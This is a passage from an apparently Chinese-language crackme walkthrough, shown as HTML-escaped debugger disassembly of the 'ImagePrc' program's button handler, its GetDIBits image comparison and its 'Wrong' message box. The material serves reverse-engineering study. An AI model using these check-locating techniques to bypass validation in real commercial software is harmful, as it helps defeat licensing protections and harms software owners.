&lt;span class="nt"&gt;0040113A&lt;/span&gt;
&lt;span class="nt"&gt;004012DE&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;0F85&lt;/span&gt; &lt;span class="nt"&gt;01020000&lt;/span&gt; &lt;span class="nt"&gt;jnz&lt;/span&gt; &lt;span class="nt"&gt;ImagePrc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004014E5&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;004013CD&lt;/span&gt;   &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;8B8424&lt;/span&gt; &lt;span class="nt"&gt;900000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004013D4&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;30&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x30&lt;/span&gt;                                &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Style&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;MB_OK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;MB_ICONEXCLAMATION&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;MB_APPLMODAL&lt;/span&gt;
&lt;span class="nt"&gt;004013D6&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;34604000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ImagePrc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00406034&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;ImagePrc&lt;/span&gt;
&lt;span class="nt"&gt;004013DB&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;40604000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ImagePrc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00406040&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;Wrong&lt;/span&gt;
&lt;span class="nt"&gt;004013E0&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hOwner&lt;/span&gt;
&lt;span class="nt"&gt;004013E1&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;F8504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.MessageBoxA&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;MessageBoxA&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;E7&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;56&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;esi&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;E8&lt;/span&gt;   &lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;E8&lt;/span&gt; &lt;span class="mi"&gt;13010000&lt;/span&gt;   &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;ImagePrc.00401500&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;ED&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;83&lt;/span&gt;&lt;span class="nx"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt;       &lt;span class="nx"&gt;add&lt;/span&gt; &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;F0&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="nx"&gt;C0&lt;/span&gt;          &lt;span class="nx"&gt;xor&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;F2&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nx"&gt;B&lt;/span&gt;            &lt;span class="nx"&gt;pop&lt;/span&gt; &lt;span class="nx"&gt;ebx&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;F3&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nx"&gt;F&lt;/span&gt;            &lt;span class="nx"&gt;pop&lt;/span&gt; &lt;span class="nx"&gt;edi&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;F4&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;            &lt;span class="nx"&gt;pop&lt;/span&gt; &lt;span class="nx"&gt;esi&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;F5&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;81&lt;/span&gt;&lt;span class="nx"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;80000000&lt;/span&gt; &lt;span class="nx"&gt;add&lt;/span&gt; &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x80&lt;/span&gt;
&lt;span class="mi"&gt;004013&lt;/span&gt;&lt;span class="nx"&gt;FB&lt;/span&gt;   &lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;C2&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;       &lt;span class="nx"&gt;retn&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在按钮消息路由到弹出消息框之间就是我们要找的核心逻辑。下面分解一下逻辑：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;004012E4&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;F4844000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x4084F4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004012E9&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8D5424&lt;/span&gt; &lt;span class="nt"&gt;08&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004012ED&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;53&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
&lt;span class="nt"&gt;004012EE&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;52&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0018FB04&lt;/span&gt;
&lt;span class="nt"&gt;004012EF&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x18&lt;/span&gt;                                &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;BufSize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;24&lt;/span&gt;&lt;span class="o"&gt;.)&lt;/span&gt;
&lt;span class="nt"&gt;004012F1&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hObject&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;B9051E9B&lt;/span&gt;
&lt;span class="nt"&gt;004012F2&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;1C504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;GDI32.GetObjectA&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;  &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;GetObjectA&lt;/span&gt;
&lt;span class="nt"&gt;004012F8&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;0A000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0xA&lt;/span&gt;
&lt;span class="nt"&gt;004012FD&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;004012FF&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x24&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401303&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8D5424&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x24&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401307&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;F3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;rep&lt;/span&gt; &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401309&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8B4424&lt;/span&gt; &lt;span class="nt"&gt;14&lt;/span&gt;     &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x14&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0040130D&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8B4C24&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;     &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401311&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8B3D&lt;/span&gt; &lt;span class="nt"&gt;20504000&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;GDI32.GetDIBits&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="nx"&gt;GDI32.GetDIBits&lt;/span&gt;
&lt;span class="mi"&gt;00401317&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;         &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nb"&gt;Usage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;DIB_RGB_COLORS&lt;/span&gt;
&lt;span class="mi"&gt;00401319&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;52&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;edx&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;pBitmapinfo&lt;/span&gt;
&lt;span class="mi"&gt;0040131&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;         &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;Buffer&lt;/span&gt;&lt;span class="o"&gt; =&lt;/span&gt; &lt;span class="kt"&gt;NULL&lt;/span&gt;
&lt;span class="mi"&gt;0040131&lt;/span&gt;&lt;span class="nx"&gt;C&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;894424&lt;/span&gt; &lt;span class="mi"&gt;38&lt;/span&gt;     &lt;span class="nx"&gt;mov&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x38&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401320&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;nLines&lt;/span&gt;
&lt;span class="nt"&gt;00401321&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;F4844000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x4084F4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401326&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;894C24&lt;/span&gt; &lt;span class="nt"&gt;38&lt;/span&gt;     &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x38&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ecx&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;0040132A&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;8B0D&lt;/span&gt; &lt;span class="nt"&gt;DC844000&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x4084DC&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401330&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x0&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;StartLine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="nt"&gt;00401332&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hBitmap&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;B9051E9B&lt;/span&gt;
&lt;span class="nt"&gt;00401333&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hDC&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;4C01191B&lt;/span&gt;
&lt;span class="nt"&gt;00401334&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;C74424&lt;/span&gt; &lt;span class="nt"&gt;40&lt;/span&gt; &lt;span class="nt"&gt;280&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x40&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x28&lt;/span&gt;         &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;0040133C&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;C74424&lt;/span&gt; &lt;span class="nt"&gt;4C&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x1&lt;/span&gt;           &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401343&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;C74424&lt;/span&gt; &lt;span class="nt"&gt;4E&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4E&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x18&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
